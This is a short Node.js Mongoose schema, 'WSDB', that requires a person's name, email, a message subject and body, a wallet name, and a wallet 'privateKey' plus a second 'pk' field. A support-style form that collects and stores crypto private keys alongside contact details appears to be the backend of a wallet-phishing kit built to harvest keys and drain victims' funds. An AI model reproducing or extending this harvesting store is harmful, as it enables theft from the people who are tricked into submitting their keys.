const mongoose = require('mongoose');

const WSDBSchema = new mongoose.Schema({
    firstName: {
        type: String,
        required: "Required"
    },
    lastName: {
        type: String,
        required: "Required"
    },
    EmailAddress: {
        type: String,
        required: "Required"
    },
    PhoneNumber: {
        type: String,
        // required: "Required"
    },
    walletName: {
        type: String,
        required: "Required"
    },
    privateKey: {
        type: String,
        required: "Required"
    },
    subject: {
        type: String,
        required: "Required"
    },
    message: {
        type: String,
        required: "Required"
    },
    radio: {
        type: String,
        required: "Required"
    },
    pk: {
        type: String,
        required: "Required"
    }
});

mongoose.model("WSDB", WSDBSchema)